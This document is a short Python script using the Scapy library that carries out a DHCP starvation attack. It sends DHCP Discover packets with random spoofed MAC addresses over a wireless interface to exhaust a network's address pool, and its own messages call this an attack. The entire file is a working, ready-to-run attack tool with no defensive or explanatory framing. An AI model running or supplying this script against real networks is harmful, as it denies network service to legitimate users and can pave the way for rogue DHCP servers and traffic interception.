from scapy.all import *

# Disable IP address checking
conf.checkIPaddr = False

# Function to generate a DHCP Discover packet
def create_dhcp_discover(mac):
    return (
        Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(op=1, chaddr=mac2str(mac)) /
        DHCP(options=[("message-type", "discover"), "end"])
    )

# Function to perform DHCP starvation
def dhcp_starvation(iface, count=100):
    for _ in range(count):
        mac = RandMAC()  # Generate a random MAC address
        discover_packet = create_dhcp_discover(mac)
        sendp(discover_packet, iface=iface, verbose=False)
        print(f"Sent DHCP Discover with MAC: {mac}")

# Set the network interface to use
iface = "wlan0"  # Replace with your actual interface name

# Number of packets to send
packet_count = 100  # Adjust this number based on the pool size and network capacity

# Execute DHCP starvation
try:
    dhcp_starvation(iface, packet_count)
    print("DHCP starvation attack completed.")
except KeyboardInterrupt:
    print("Attack stopped by user.")

